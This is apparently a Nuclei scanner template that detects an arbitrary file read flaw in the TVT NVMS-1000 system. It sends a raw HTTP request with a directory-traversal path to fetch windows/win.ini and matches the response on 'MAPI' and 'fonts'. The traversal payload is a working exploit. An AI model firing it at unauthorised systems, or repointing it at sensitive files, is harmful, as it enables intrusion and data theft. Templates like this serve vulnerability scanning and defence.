id: TVT-NVMS-1000-ReadAnyFile

info:
  name: TVT-NVMS-1000-ReadAnyFile
  author: iSee857
  severity: high
  description: TVT-NVMS-1000-ReadAnyFile

requests:
  - method: GET
    raw:
      - |
        GET /../../../../../../../../../../../../windows/win.ini HTTP/1.1
        Host: {{Host}}

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "MAPI"
          - "fonts"
        condition: and
        part: body

      - type: status
        status:
          - 200